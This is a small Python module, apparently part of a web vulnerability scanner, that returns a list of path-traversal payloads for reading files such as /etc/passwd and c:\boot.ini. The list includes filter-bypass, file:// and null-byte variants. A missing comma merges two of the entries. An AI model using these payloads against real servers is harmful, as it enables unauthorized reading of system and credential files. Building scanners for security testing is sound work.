# -*- coding: utf-8 -*-
"""
"* Author     : M0nk3y"
"* Version    : 1.0"
"""

"""file_download"""
file_download_payloads = ['../../../../../../../etc/passwd',
                          r'c:\boot.ini',
                          '..|/..|/..|/..|/..|/..|/etc/passwd',
                          '..././..././..././..././..././..././..././etc/passwd''',
                          'file:///etc/passwd',
                          r'file://c:\boot.init'
                          '../../../../../../../../etc/passwd%00'
                          ]


def get_file_download_payloads():
    return file_download_payloads
